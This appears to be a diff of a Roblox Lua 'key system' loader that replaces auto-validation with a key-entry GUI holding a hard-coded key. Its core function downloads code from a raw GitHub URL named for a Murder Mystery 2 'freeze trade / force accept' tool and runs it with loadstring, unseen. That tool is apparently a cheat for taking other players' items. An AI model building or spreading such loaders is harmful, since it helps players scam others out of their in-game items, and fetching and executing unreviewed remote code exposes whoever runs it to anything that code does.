@@ -1,5 +1,7 @@
--- Eclipse Productions Key System v1.0 (Auto-Validation)
--- This script automatically validates the key passed from the loader
+-- Eclipse Productions Key System v1.0
+-- This script asks for a key instead of showing it
+
+local ValidKey = "MM2PREMIUMKEYS1D" -- The correct key
 
 local Library = {
     Colors = {
@@ -11,10 +13,6 @@ local Library = {
     }
 }
 
--- Get the key from the loader
-local args = {...}
-local ValidKey = args[1] or "MM2PREMIUMKEYS1D" -- Fallback key
-
 -- Create GUI
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "EclipseKeySystem"
@@ -23,8 +21,8 @@ ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 -- Main Frame
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
-MainFrame.Size = UDim2.new(0, 400, 0, 280)
-MainFrame.Position = UDim2.new(0.5, -200, 0.5, -140)
+MainFrame.Size = UDim2.new(0, 400, 0, 350)
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -175)
 MainFrame.BackgroundColor3 = Library.Colors.Secondary
 MainFrame.BackgroundTransparency = 0.1
 MainFrame.BorderSizePixel = 0
@@ -48,57 +46,133 @@ Title.Font = Enum.Font.GothamBold
 Title.TextStrokeTransparency = 0.5
 Title.Parent = MainFrame
 
--- Status Label (shows progress)
+-- Subtitle
+local Subtitle = Instance.new("TextLabel")
+Subtitle.Size = UDim2.new(1, 0, 0, 30)
+Subtitle.Position = UDim2.new(0, 0, 0, 70)
+Subtitle.BackgroundTransparency = 1
+Subtitle.Text = "ENTER VALID KEY TO CONTINUE"
+Subtitle.TextColor3 = Library.Colors.Text
+Subtitle.TextScaled = true
+Subtitle.Font = Enum.Font.Gotham
+Subtitle.TextTransparency = 0.3
+Subtitle.Parent = MainFrame
+
+-- Key Input Box
+local KeyBox = Instance.new("TextBox")
+KeyBox.Size = UDim2.new(0.8, 0, 0, 45)
+KeyBox.Position = UDim2.new(0.1, 0, 0, 120)
+KeyBox.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+KeyBox.TextColor3 = Library.Colors.Text
+KeyBox.TextScaled = true
+KeyBox.Font = Enum.Font.Gotham
+KeyBox.PlaceholderText = "ENTER KEY HERE"
+KeyBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+KeyBox.ClearTextOnFocus = false
+KeyBox.Parent = MainFrame
+
+local KeyCorner = Instance.new("UICorner")
+KeyCorner.CornerRadius = UDim.new(0, 8)
+KeyCorner.Parent = KeyBox
+
+-- Submit Button
+local SubmitBtn = Instance.new("TextButton")
+SubmitBtn.Size = UDim2.new(0.6, 0, 0, 45)
+SubmitBtn.Position = UDim2.new(0.2, 0, 0, 190)
+SubmitBtn.BackgroundColor3 = Library.Colors.Primary
+SubmitBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+SubmitBtn.Text = "VERIFY KEY"
+SubmitBtn.TextScaled = true
+SubmitBtn.Font = Enum.Font.GothamBold
+SubmitBtn.Parent = MainFrame
+
+local SubmitCorner = Instance.new("UICorner")
+SubmitCorner.CornerRadius = UDim.new(0, 8)
+SubmitCorner.Parent = SubmitBtn
+
+-- Status Label
 local Status = Instance.new("TextLabel")
-Status.Size = UDim2.new(1, 0, 0, 40)
-Status.Position = UDim2.new(0, 0, 0, 80)
+Status.Size = UDim2.new(1, 0, 0, 30)
+Status.Position = UDim2.new(0, 0, 0, 260)
 Status.BackgroundTransparency = 1
-Status.Text = "VERIFYING KEY..."
-Status.TextColor3 = Library.Colors.Primary
+Status.Text = ""
+Status.TextColor3 = Library.Colors.Accent
 Status.TextScaled = true
-Status.Font = Enum.Font.GothamBold
+Status.Font = Enum.Font.Gotham
 Status.Parent = MainFrame
 
--- Loading Spinner
-local SpinnerFrame = Instance.new("Frame")
-SpinnerFrame.Size = UDim2.new(0, 50, 0, 50)
-SpinnerFrame.Position = UDim2.new(0.5, -25, 0.55, 0)
-SpinnerFrame.BackgroundColor3 = Library.Colors.Primary
-SpinnerFrame.BackgroundTransparency = 0.5
-SpinnerFrame.BorderSizePixel = 0
-SpinnerFrame.Parent = MainFrame
+-- Loading GUI (hidden by default)
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Size = UDim2.new(0, 200, 0, 120)
+LoadingFrame.Position = UDim2.new(0.5, -100, 0.5, -60)
+LoadingFrame.BackgroundColor3 = Library.Colors.Secondary
+LoadingFrame.BackgroundTransparency = 0.2
+LoadingFrame.BorderSizePixel = 0
+LoadingFrame.Visible = false
+LoadingFrame.Parent = ScreenGui
+
+local LoadingCorner = Instance.new("UICorner")
+LoadingCorner.CornerRadius = UDim.new(0, 12)
+LoadingCorner.Parent = LoadingFrame
+
+local LoadingText = Instance.new("TextLabel")
+LoadingText.Size = UDim2.new(1, 0, 0.5, 0)
+LoadingText.Position = UDim2.new(0, 0, 0.2, 0)
+LoadingText.BackgroundTransparency = 1
+LoadingText.Text = "LOADING..."
+LoadingText.TextColor3 = Library.Colors.Primary
+LoadingText.TextScaled = true
+LoadingText.Font = Enum.Font.GothamBold
+LoadingText.Parent = LoadingFrame
+
+local Spinner = Instance.new("Frame")
+Spinner.Size = UDim2.new(0, 30, 0, 30)
+Spinner.Position = UDim2.new(0.5, -15, 0.7, 0)
+Spinner.BackgroundColor3 = Library.Colors.Primary
+Spinner.BackgroundTransparency = 0.5
+Spinner.BorderSizePixel = 0
+Spinner.Parent = LoadingFrame
 
 local SpinnerCorner = Instance.new("UICorner")
 SpinnerCorner.CornerRadius = UDim.new(1, 0)
-SpinnerCorner.Parent = SpinnerFrame
-
--- Rotate the spinner
-game:GetService("TweenService"):Create(SpinnerFrame, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {Rotation = 360}):Play()
-
--- Key display (shows the key being used)
-local KeyDisplay = Instance.new("TextLabel")
-KeyDisplay.Size = UDim2.new(1, 0, 0, 30)
-KeyDisplay.Position = UDim2.new(0, 0, 0, 170)
-KeyDisplay.BackgroundTransparency = 1
-KeyDisplay.Text = "Key: " .. ValidKey
-KeyDisplay.TextColor3 = Library.Colors.Text
-KeyDisplay.TextScaled = true
-KeyDisplay.Font = Enum.Font.Gotham
-KeyDisplay.TextTransparency = 0.5
-KeyDisplay.Parent = MainFrame
+SpinnerCorner.Parent = Spinner
 
 -- Functions
-function UpdateStatus(text, color)
+function ShowLoading(show)
+    LoadingFrame.Visible = show
+    MainFrame.Visible = not show
+    if show then
+        game:GetService("TweenService"):Create(Spinner, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {Rotation = 360}):Play()
+    end
+end
+
+function SetStatus(text, color)
     Status.Text = text
     if color then Status.TextColor3 = color end
 end
 
+function ValidateKey(inputKey)
+    if inputKey == nil or inputKey == "" then
+        SetStatus("Please enter a key!", Library.Colors.Accent)
+        return false
+    end
+    
+    -- Check if the entered key matches the valid key
+    if inputKey == ValidKey then
+        return true
+    else
+        return false
+    end
+end
+
 function LoadMainScript()
-    UpdateStatus("LOADING SCRIPT...", Library.Colors.Primary)
+    ShowLoading(true)
     
     local success, scriptData = pcall(function()
         return game:HttpGet("https://raw.githubusercontent.com/ArisuYT/Mm2FreezeTrade/refs/heads/main/ForceAccept")
     end)
+    
+    ShowLoading(false)
     
     if success then
         local func, err = loadstring(scriptData)
@@ -119,25 +193,38 @@ function ClearKeySystem()
     ScreenGui:Destroy()
 end
 
--- Auto-validation sequence
-task.wait(1) -- Show UI briefly
+-- Submit Logic
+SubmitBtn.MouseButton1Click:Connect(function()
+    local key = KeyBox.Text
+    if ValidateKey(key) then
+        SetStatus("Key Validated! Loading...", Color3.fromRGB(0, 255, 0))
+        task.wait(1)
+        
+        local loaded = LoadMainScript()
+        
+        if loaded then
+            SetStatus("Success! Starting...", Color3.fromRGB(0, 255, 0))
+            task.wait(0.5)
+            ClearKeySystem()
+        else
+            SetStatus("Failed to load script.", Library.Colors.Accent)
+        end
+    else
+        SetStatus("Invalid Key! Try again.", Library.Colors.Accent)
+        KeyBox.Text = ""
+    end
+end)
 
-UpdateStatus("KEY FOUND! VALIDATING...", Color3.fromRGB(0, 255, 0))
-task.wait(0.5)
+-- Enter key support
+KeyBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        SubmitBtn.MouseButton1Click:Fire()
+    end
+end)
 
--- Simulate key validation (always valid since key is embedded)
-UpdateStatus("KEY VALIDATED! LOADING...", Color3.fromRGB(0, 255, 0))
-task.wait(0.5)
-
--- Load the main script
-local loaded = LoadMainScript()
-
-if loaded then
-    UpdateStatus("SUCCESS! STARTING...", Color3.fromRGB(0, 255, 0))
-    task.wait(0.5)
-    ClearKeySystem()
-else
-    UpdateStatus("FAILED TO LOAD SCRIPT.", Library.Colors.Accent)
-    task.wait(2)
-    ClearKeySystem() -- Close even on failure
-end
+-- Animation on startup
+MainFrame.BackgroundTransparency = 1
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -175)
+game:GetService("TweenService"):Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    BackgroundTransparency = 0.1
+}):Play()
